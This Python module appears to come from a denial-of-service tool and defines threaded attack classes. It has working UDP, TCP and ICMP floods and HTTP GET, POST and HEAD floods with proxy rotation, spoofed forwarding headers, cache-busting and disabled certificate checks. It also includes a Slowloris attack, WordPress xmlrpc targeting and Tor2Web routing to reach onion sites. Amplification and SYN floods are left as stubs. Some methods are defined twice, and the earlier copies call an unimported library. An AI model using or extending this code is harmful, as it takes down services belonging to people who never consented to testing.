#!/usr/bin/env python3

import concurrent.futures
import logging
import random
import socket
import string
import struct
import threading
import time
from typing import Dict, List, Set, Tuple, Any, Optional
from urllib.parse import urlparse

# Import our custom proxy implementation
from modules.proxy_scanner import Proxy, ProxyType
from ssl import CERT_NONE, SSLContext, create_default_context
from certifi import where
from requests import Session, Response
from impacket.ImpactPacket import IP, TCP, UDP, ICMP, Data

# List of Tor2Web proxy services for TOR attack method
tor2webs = [
    "onion.to",
    "onion.ws",
    "onion.pet",
    "onion.ly",
    "onion.link",
    "onion.dog",
    "onion.cab"
]

logger = logging.getLogger("NetSecTest.AttackMethods")

# Create SSL context
ctx = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

class AttackBase:
    """Base class for attack methods."""
    
    def __init__(self, storage):
        self.storage = storage
        self.running_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
    
    def get_running_attacks_count(self):
        """Get the number of currently running attacks."""
        return len(self.running_attacks)
    
    def stop_all_attacks(self):
        """Stop all running attacks."""
        with self.lock:
            for attack_id, attack in list(self.running_attacks.items()):
                self._stop_attack(attack_id)
    
    def _stop_attack(self, attack_id):
        """Stop a specific attack by ID."""
        attack_id_str = str(attack_id)  # Ensure we have a string ID for comparison
        
        with self.lock:
            # Try exact match first
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id]["running"] = False
                logger.info(f"Stopping attack {attack_id}")
                
                # Wait for the thread to finish
                if "thread" in self.running_attacks[attack_id]:
                    self.running_attacks[attack_id]["thread"].join(timeout=2)
                
                # Remove from running attacks
                del self.running_attacks[attack_id]
                return True
            
            # Try string match
            elif attack_id_str in self.running_attacks:
                self.running_attacks[attack_id_str]["running"] = False
                logger.info(f"Stopping attack {attack_id_str}")
                
                # Wait for the thread to finish
                if "thread" in self.running_attacks[attack_id_str]:
                    self.running_attacks[attack_id_str]["thread"].join(timeout=2)
                
                # Remove from running attacks
                del self.running_attacks[attack_id_str]
                return True
            
            # Try to find by string conversion if exact match fails
            for aid, attack in list(self.running_attacks.items()):
                if str(aid) == attack_id_str:
                    attack["running"] = False
                    logger.info(f"Stopping attack {aid}")
                    
                    # Wait for the thread to finish
                    if "thread" in attack:
                        attack["thread"].join(timeout=2)
                    
                    # Remove from running attacks
                    del self.running_attacks[aid]
                    return True
            
            logger.warning(f"Attack {attack_id} not found in running attacks")
            return False
    
    def _start_attack(self, target, method, duration, threads, **kwargs):
        """Internal method to start an attack."""
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            
            attack = {
                "id": attack_id,
                "target": target,
                "method": method,
                "duration": duration,
                "threads": threads,
                "start_time": time.time(),
                "running": True,
                "options": kwargs
            }
            
            # Start the attack in a separate thread
            attack_thread = threading.Thread(
                target=self._attack_runner,
                args=(attack,),
                daemon=True
            )
            attack["thread"] = attack_thread
            
            # Add to running attacks
            self.running_attacks[attack_id] = attack
            
            # Start the thread
            attack_thread.start()
            
            logger.info(f"Started {method} attack (ID: {attack_id}) against {target}")
            
            return attack_id
    
    def _attack_runner(self, attack):
        """Runner for an attack that manages its duration."""
        try:
            method_name = attack['method'].lower()
            
            # Map method names to specific attack functions or use default fallbacks
            method_mapping = {
                'get': self._attack_get,
                'post': self._attack_post,
                'head': self._attack_head,
                'slow': self._attack_slow,
            }
            
            # Special handling for other methods
            if method_name not in method_mapping:
                if method_name in ['ovh', 'rhex', 'stomp', 'dyn', 'cookie', 'pps', 'even',
                               'gsb', 'dgb', 'avb', 'bot', 'apache', 'bypass', 'cfb', 'cfbuam']:
                    # Web-based attacks - default to GET
                    method_func = self._attack_get
                elif method_name in ['downloader', 'killer']:
                    # Connection based attacks - use slow
                    method_func = self._attack_slow
                elif method_name == 'xmlrpc':
                    # WordPress specific attack - use POST
                    method_func = self._attack_post
                else:
                    # Default to GET for any other method
                    method_func = self._attack_get
            else:
                method_func = method_mapping[method_name]
            
            logger.info(f"Starting Layer 7 {attack['method']} attack against {attack['target']}")
            
            # Get start time and duration
            start_time = attack["start_time"]
            duration = attack["duration"]
            
            # Start the actual attack
            with concurrent.futures.ThreadPoolExecutor(max_workers=attack["threads"]) as executor:
                futures = []
                
                while attack["running"] and time.time() - start_time < duration:
                    # Limit to the number of threads
                    while len(futures) < attack["threads"]:
                        future = executor.submit(method_func, attack)
                        futures.append(future)
                    
                    # Clean up completed futures
                    futures = [f for f in futures if not f.done()]
                    
                    # Short sleep to prevent tight loop
                    time.sleep(0.1)
                
                # Wait for remaining futures to complete
                concurrent.futures.wait(futures, timeout=2)
            
            logger.info(f"Finished Layer 7 {attack['method']} attack (ID: {attack['id']}) against {attack['target']}")
            
            # Mark attack as completed
            attack["running"] = False
            logger.info(f"Attack {attack['id']} completed")
        
        except Exception as e:
            logger.error(f"Error in attack runner: {e}")
            attack["running"] = False


class Layer4(AttackBase):
    """Layer 4 attack methods."""
    
    def __init__(self, storage):
        super().__init__(storage)
        
    def _attack_runner(self, attack):
        """Runner for an attack that manages its duration."""
        try:
            method_name = attack['method'].lower()
            
            # Map method names to specific attack functions or use default fallbacks
            method_mapping = {
                'udp': self._attack_udp,
                'tcp': self._attack_tcp,
                'syn': self._attack_syn,
                'icmp': self._attack_icmp,
                'dns': self._attack_dns,
                'ntp': self._attack_ntp,
                'cldap': self._attack_cldap
            }
            
            # Special handling for other methods
            if method_name not in method_mapping:
                if method_name in ['mem', 'char', 'ard', 'rdp']:
                    # Reflection/amplification attacks
                    method_func = self._attack_udp
                elif method_name in ['minecraft', 'mcpe', 'mcbot', 'vse', 'ts3', 'fivem']:
                    # Game protocol attacks
                    method_func = self._attack_udp
                elif method_name in ['connection', 'cps']:
                    # Connection based attacks
                    method_func = self._attack_tcp
                else:
                    # Default to UDP for any other method
                    method_func = self._attack_udp
            else:
                method_func = method_mapping[method_name]
            
            logger.info(f"Starting Layer 4 {attack['method']} attack against {attack['target']}")
            
            # Get start time and duration
            start_time = attack["start_time"]
            duration = attack["duration"]
            
            # Start the actual attack
            with concurrent.futures.ThreadPoolExecutor(max_workers=attack["threads"]) as executor:
                futures = []
                
                while attack["running"] and time.time() - start_time < duration:
                    # Limit to the number of threads
                    while len(futures) < attack["threads"]:
                        future = executor.submit(method_func, attack)
                        futures.append(future)
                    
                    # Clean up completed futures
                    futures = [f for f in futures if not f.done()]
                    
                    # Short sleep to prevent tight loop
                    time.sleep(0.1)
                
                # Wait for remaining futures to complete
                concurrent.futures.wait(futures, timeout=2)
            
            logger.info(f"Finished Layer 4 {attack['method']} attack (ID: {attack['id']}) against {attack['target']}")
            
            # Mark attack as completed
            attack["running"] = False
            
        except Exception as e:
            logger.error(f"Error in attack runner: {e}")
            
        finally:
            # Remove from running attacks
            with self.lock:
                if attack["id"] in self.running_attacks:
                    del self.running_attacks[attack["id"]]
    
    def start_attack(self, target, method, duration=60, threads=10, **kwargs):
        """Start a Layer 4 attack."""
        # Validate the attack method
        supported_methods = {
            "UDP", "TCP", "SYN", "ICMP", "DNS", "NTP", "CLDAP", "MEM", "ARD",
            "CHAR", "RDP", "VSE", "MINECRAFT", "MCBOT", "MCPE", "CONNECTION", 
            "CPS", "FIVEM", "TS3"
        }
        
        if method not in supported_methods:
            raise ValueError(f"Unsupported Layer 4 attack method: {method}")
        
        # Validate the target (should be ip:port for most methods)
        if ":" in target:
            ip, port = target.split(":")
            try:
                port = int(port)
                socket.inet_aton(ip)  # Validate IP format
            except (ValueError, socket.error):
                raise ValueError(f"Invalid target format: {target}, should be IP:PORT")
        else:
            # For ICMP, target can be just an IP
            if method == "ICMP":
                try:
                    socket.inet_aton(target)  # Validate IP format
                except socket.error:
                    raise ValueError(f"Invalid IP address: {target}")
            else:
                raise ValueError(f"Invalid target format: {target}, should be IP:PORT")
        
        # Start the attack
        return self._start_attack(target, method, duration, threads, **kwargs)
    
    def _attack_udp(self, attack):
        """UDP flood attack."""
        try:
            target = attack["target"]
            if ":" in target:
                ip, port_str = target.split(":")
                port = int(port_str)
            else:
                ip = target
                port = 0  # Use random port if not specified
            
            # Create packet data
            packet_size = attack["options"].get("packet_size", 1024)
            data = random.randbytes(packet_size)
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # If use_amplification is enabled, route through amplification server
            if attack["options"].get("use_amplification", False):
                amp_servers = self.storage.get_working_amplification_servers("UDP")
                if amp_servers:
                    server = random.choice(amp_servers)
                    # In a real implementation, we would craft a packet with spoofed source IP
                    # For ethical reasons, we're not implementing actual amplification here
                    logger.debug(f"Would use UDP amplification server: {server['ip']}:{server['port']}")
            
            # Send packet
            sock.sendto(data, (ip, port))
            sock.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in UDP attack: {e}")
    
    def _attack_tcp(self, attack):
        """TCP flood attack."""
        try:
            target = attack["target"]
            ip, port_str = target.split(":")
            port = int(port_str)
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(attack["options"].get("timeout", 5))
            
            # Connect to target
            sock.connect((ip, port))
            
            # Send data
            packet_size = attack["options"].get("packet_size", 1024)
            data = random.randbytes(packet_size)
            sock.send(data)
            
            # Close connection
            sock.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in TCP attack: {e}")
    
    def _attack_syn(self, attack):
        """SYN flood attack."""
        try:
            target = attack["target"]
            ip, port_str = target.split(":")
            port = int(port_str)
            
            # In a real implementation, this would create raw IP packets with SYN flag
            # For ethical reasons, we're not implementing actual SYN flood
            logger.debug(f"Would send SYN packet to {ip}:{port}")
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0.1)
            time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in SYN attack: {e}")
    
    def _attack_icmp(self, attack):
        """ICMP flood attack."""
        try:
            target = attack["target"]
            if ":" in target:
                ip, _ = target.split(":")
            else:
                ip = target
            
            # Use standard ping instead of raw sockets for ethical testing
            packet_size = min(1000, attack["options"].get("packet_size", 64))
            
            # Create a socket for ICMP
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(attack["options"].get("timeout", 1))
            
            # Create ICMP header
            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = 1
            
            # Create ICMP packet
            header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            data = b"\x00" * packet_size
            
            # Calculate checksum
            checksum = 0
            for i in range(0, len(header + data), 2):
                if i + 1 < len(header + data):
                    checksum += (header + data)[i] + ((header + data)[i + 1] << 8)
                else:
                    checksum += (header + data)[i]
            checksum = (checksum >> 16) + (checksum & 0xffff)
            checksum = ~checksum & 0xffff
            
            # Create final packet with correct checksum
            header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(checksum), icmp_id, icmp_seq)
            packet = header + data
            
            # Send packet
            sock.sendto(packet, (ip, 0))
            sock.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0.1)
            time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in ICMP attack: {e}")
    
    def _attack_dns(self, attack):
        """DNS amplification attack."""
        try:
            # Get amplification servers if enabled
            if attack["options"].get("use_amplification", False):
                amp_servers = self.storage.get_working_amplification_servers("DNS")
                if not amp_servers:
                    logger.warning("No DNS amplification servers available")
                    return
                
                server = random.choice(amp_servers)
                target_ip = server["ip"]
                target_port = server["port"]
                
                # In a real implementation, we would craft a packet with spoofed source IP
                # For ethical reasons, we're not implementing actual amplification
                logger.debug(f"Would use DNS amplification server: {target_ip}:{target_port}")
            else:
                # Direct DNS query to target
                target = attack["target"]
                target_ip, port_str = target.split(":")
                target_port = int(port_str)
            
            # This is a simulated implementation
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0.1)
            time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in DNS attack: {e}")
    
    def _attack_ntp(self, attack):
        """NTP amplification attack."""
        try:
            # Get amplification servers if enabled
            if attack["options"].get("use_amplification", False):
                amp_servers = self.storage.get_working_amplification_servers("NTP")
                if not amp_servers:
                    logger.warning("No NTP amplification servers available")
                    return
                
                server = random.choice(amp_servers)
                target_ip = server["ip"]
                target_port = server["port"]
                
                # In a real implementation, we would craft a packet with spoofed source IP
                # For ethical reasons, we're not implementing actual amplification
                logger.debug(f"Would use NTP amplification server: {target_ip}:{target_port}")
            else:
                # Direct NTP query to target
                target = attack["target"]
                target_ip, port_str = target.split(":")
                target_port = int(port_str)
            
            # This is a simulated implementation
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0.1)
            time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in NTP attack: {e}")
    
    def _attack_cldap(self, attack):
        """CLDAP amplification attack."""
        try:
            # Get amplification servers if enabled
            if attack["options"].get("use_amplification", False):
                amp_servers = self.storage.get_working_amplification_servers("CLDAP")
                if not amp_servers:
                    logger.warning("No CLDAP amplification servers available")
                    return
                
                server = random.choice(amp_servers)
                target_ip = server["ip"]
                target_port = server["port"]
                
                # In a real implementation, we would craft a packet with spoofed source IP
                # For ethical reasons, we're not implementing actual amplification
                logger.debug(f"Would use CLDAP amplification server: {target_ip}:{target_port}")
            else:
                # Direct CLDAP query to target
                target = attack["target"]
                target_ip, port_str = target.split(":")
                target_port = int(port_str)
            
            # This is a simulated implementation
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0.1)
            time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in CLDAP attack: {e}")


class Layer7(AttackBase):
    """Layer 7 attack methods."""
    
    def __init__(self, storage):
        super().__init__(storage)
        
        # User agents for randomization
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
    
    def _attack_get(self, attack):
        """HTTP GET flood attack."""
        target = attack["target"]
        threads = attack["threads"]
        use_proxies = attack.get("use_proxies", True)
        
        logger.debug(f"Running GET attack on {target} with {threads} threads")
        
        # Implementation for GET attack
        try:
            # Get user agent
            user_agent = random.choice(self.user_agents)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            # Add special headers for OVH bypass if method is OVH
            if attack["method"].lower() == "ovh":
                headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                headers["X-Real-IP"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            
            # Get proxy if using proxies
            proxy = self._get_proxy() if use_proxies else None
            
            # Send the request
            try:
                if proxy:
                    response = requests.get(
                        target,
                        headers=headers,
                        proxies=proxy,
                        verify=False,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        target,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                
                logger.debug(f"GET request to {target} returned status code {response.status_code}")
            except Exception as e:
                logger.debug(f"GET request to {target} failed: {e}")
                
        except Exception as e:
            logger.debug(f"Error in GET attack: {e}")
            
    def _attack_post(self, attack):
        """HTTP POST flood attack."""
        target = attack["target"]
        threads = attack["threads"]
        use_proxies = attack.get("use_proxies", True)
        
        logger.debug(f"Running POST attack on {target} with {threads} threads")
        
        # Implementation for POST attack
        try:
            # Get user agent
            user_agent = random.choice(self.user_agents)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            # Prepare payload
            if attack["method"].lower() == "xmlrpc":
                # WordPress XMLRPC payload
                payload = """<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                headers["Content-Type"] = "text/xml"
            else:
                # Regular POST payload
                payload = {
                    "field1": "value1",
                    "field2": "value2",
                    "field3": f"value3_{random.randint(1000, 9999)}"
                }
            
            # Get proxy if using proxies
            proxy = self._get_proxy() if use_proxies else None
            
            # Send the request
            try:
                if proxy:
                    if attack["method"].lower() == "xmlrpc":
                        response = requests.post(
                            target,
                            headers=headers,
                            data=payload,
                            proxies=proxy,
                            verify=False,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            target,
                            headers=headers,
                            data=payload,
                            proxies=proxy,
                            verify=False,
                            timeout=10
                        )
                else:
                    if attack["method"].lower() == "xmlrpc":
                        response = requests.post(
                            target,
                            headers=headers,
                            data=payload,
                            verify=False,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            target,
                            headers=headers,
                            data=payload,
                            verify=False,
                            timeout=10
                        )
                
                logger.debug(f"POST request to {target} returned status code {response.status_code}")
            except Exception as e:
                logger.debug(f"POST request to {target} failed: {e}")
                
        except Exception as e:
            logger.debug(f"Error in POST attack: {e}")
            
    def _attack_head(self, attack):
        """HTTP HEAD flood attack."""
        target = attack["target"]
        threads = attack["threads"]
        use_proxies = attack.get("use_proxies", True)
        
        logger.debug(f"Running HEAD attack on {target} with {threads} threads")
        
        # Implementation for HEAD attack
        try:
            # Get user agent
            user_agent = random.choice(self.user_agents)
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            # Get proxy if using proxies
            proxy = self._get_proxy() if use_proxies else None
            
            # Send the request
            try:
                if proxy:
                    response = requests.head(
                        target,
                        headers=headers,
                        proxies=proxy,
                        verify=False,
                        timeout=10
                    )
                else:
                    response = requests.head(
                        target,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                
                logger.debug(f"HEAD request to {target} returned status code {response.status_code}")
            except Exception as e:
                logger.debug(f"HEAD request to {target} failed: {e}")
                
        except Exception as e:
            logger.debug(f"Error in HEAD attack: {e}")
            
    def _attack_slow(self, attack):
        """Slowloris attack."""
        target = attack["target"]
        threads = attack["threads"]
        use_proxies = attack.get("use_proxies", True)
        
        logger.debug(f"Running SLOW attack on {target} with {threads} threads")
        
        # Implementation for Slowloris attack
        try:
            # Parse the target URL
            parsed = urlparse(target)
            host = parsed.netloc
            port = 443 if parsed.scheme == "https" else 80
            
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            try:
                # Connect to the target
                s.connect((host, port))
                
                # Send a partial HTTP request
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                
                # Send headers slowly
                for i in range(10):
                    header = f"X-a{i}: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    time.sleep(random.uniform(1, 3))
                
                # Don't close the connection
                logger.debug(f"SLOW attack socket to {target} established")
            except Exception as e:
                logger.debug(f"SLOW attack socket to {target} failed: {e}")
                s.close()
                
        except Exception as e:
            logger.debug(f"Error in SLOW attack: {e}")
    
    def start_attack(self, target, method, duration=60, threads=10, **kwargs):
        """Start a Layer 7 attack."""
        # Validate the attack method
        supported_methods = {
            "GET", "POST", "HEAD", "SLOW", "OVH", "RHEX", "STOMP", "STRESS",
            "DYN", "DOWNLOADER", "NULL", "COOKIE", "PPS", "EVEN", "GSB", 
            "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", 
            "BYPASS", "BOMB", "KILLER", "TOR"
        }
        
        if method not in supported_methods:
            raise ValueError(f"Unsupported Layer 7 attack method: {method}")
        
        # Validate the target (should be a URL)
        # Automatically add https:// if no scheme is provided
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            raise ValueError(f"Invalid target URL: {target}, error: {e}")
        
        # Special case for WordPress XMLRPC
        if method == "XMLRPC" and not target.endswith("/xmlrpc.php"):
            # Append /xmlrpc.php to the target URL
            if target.endswith("/"):
                target = target + "xmlrpc.php"
            else:
                target = target + "/xmlrpc.php"
        
        # Special case for Tor sites
        if method == "TOR" and ".onion" in target:
            # Use a Tor2Web service to access onion sites
            parsed = urlparse(target)
            onion_host = parsed.netloc
            tor2web = random.choice(tor2webs)
            new_host = f"{onion_host}.{tor2web}"
            target = target.replace(onion_host, new_host)
        
        # Start the attack
        return self._start_attack(target, method, duration, threads, **kwargs)
    
    def _get_proxy(self):
        """Get a random working proxy if available."""
        if self.storage.get_proxy_count() > 0:
            proxies = self.storage.get_working_proxies()
            if proxies:
                proxy_data = random.choice(proxies)
                try:
                    proxy_type = None
                    if proxy_data["type"] == "HTTP":
                        proxy_type = ProxyType.HTTP
                    elif proxy_data["type"] == "HTTPS":
                        proxy_type = ProxyType.HTTPS
                    elif proxy_data["type"] == "SOCKS4":
                        proxy_type = ProxyType.SOCKS4
                    elif proxy_data["type"] == "SOCKS5":
                        proxy_type = ProxyType.SOCKS5
                    else:
                        proxy_type = ProxyType.HTTP
                        
                    return Proxy(
                        proxy_type, 
                        proxy_data["ip"], 
                        proxy_data["port"]
                    )
                except Exception as e:
                    logger.debug(f"Error creating proxy: {e}")
        return None
    
    def _attack_get(self, attack):
        """HTTP GET flood attack."""
        try:
            target = attack["target"]
            use_proxies = attack["options"].get("use_proxies", False)
            
            # Get a proxy if enabled
            proxy = self._get_proxy() if use_proxies else None
            
            # Create a session
            session = Session()
            if proxy:
                session.proxies = proxy.get_dict()
            
            # Set random headers
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-cache"
            }
            
            # Add random query parameter to bypass cache
            if "?" in target:
                target += f"&_={random.randint(1000000, 9999999)}"
            else:
                target += f"?_={random.randint(1000000, 9999999)}"
            
            # Send request
            response = session.get(
                target, 
                headers=headers, 
                timeout=attack["options"].get("timeout", 5),
                verify=False
            )
            
            # Close session
            session.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in GET attack: {e}")
    
    def _attack_post(self, attack):
        """HTTP POST flood attack."""
        try:
            target = attack["target"]
            use_proxies = attack["options"].get("use_proxies", False)
            
            # Get a proxy if enabled
            proxy = self._get_proxy() if use_proxies else None
            
            # Create a session
            session = Session()
            if proxy:
                session.proxies = proxy.get_dict()
            
            # Set random headers
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            # Generate random post data
            data_size = attack["options"].get("data_size", 1000)
            data = {
                f"field_{i}": ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                for i in range(min(100, data_size // 10))
            }
            
            # Send request
            response = session.post(
                target, 
                headers=headers, 
                data=data,
                timeout=attack["options"].get("timeout", 5),
                verify=False
            )
            
            # Close session
            session.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in POST attack: {e}")
    
    def _attack_head(self, attack):
        """HTTP HEAD flood attack."""
        try:
            target = attack["target"]
            use_proxies = attack["options"].get("use_proxies", False)
            
            # Get a proxy if enabled
            proxy = self._get_proxy() if use_proxies else None
            
            # Create a session
            session = Session()
            if proxy:
                session.proxies = proxy.get_dict()
            
            # Set random headers
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache"
            }
            
            # Add random query parameter to bypass cache
            if "?" in target:
                target += f"&_={random.randint(1000000, 9999999)}"
            else:
                target += f"?_={random.randint(1000000, 9999999)}"
            
            # Send request
            response = session.head(
                target, 
                headers=headers, 
                timeout=attack["options"].get("timeout", 5),
                verify=False
            )
            
            # Close session
            session.close()
            
            # Sleep to control rate
            sleep_time = attack["options"].get("sleep", 0)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        except Exception as e:
            logger.debug(f"Error in HEAD attack: {e}")
    
    def _attack_slow(self, attack):
        """Slowloris attack."""
        try:
            target = attack["target"]
            parsed = urlparse(target)
            host = parsed.netloc
            
            # Determine port
            port = parsed.port
            if not port:
                port = 443 if parsed.scheme == "https" else 80
            
            # Determine IP
            ip = socket.gethostbyname(host.split(":")[0])
            
            # Number of sockets to create
            num_sockets = attack["options"].get("sockets", 10)
            
            # Create sockets
            sockets = []
            for _ in range(num_sockets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, port))
                    
                    # Send partial HTTP request
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {host}\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    
                    sockets.append(s)
                except Exception as e:
                    logger.debug(f"Error creating socket for Slowloris: {e}")
            
            # Send partial headers periodically
            headers = [
                "X-a: ",
                "X-b: ",
                "X-c: ",
                "X-d: ",
                "X-e: ",
                "X-f: ",
                "X-g: ",
                "X-h: ",
                "X-i: "
            ]
            
            # Send a random header to each socket
            for s in sockets:
                try:
                    s.send(f"{random.choice(headers)}{random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    pass
            
            # Close all sockets
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
            
            # Sleep to control rate
            time.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Error in Slowloris attack: {e}")
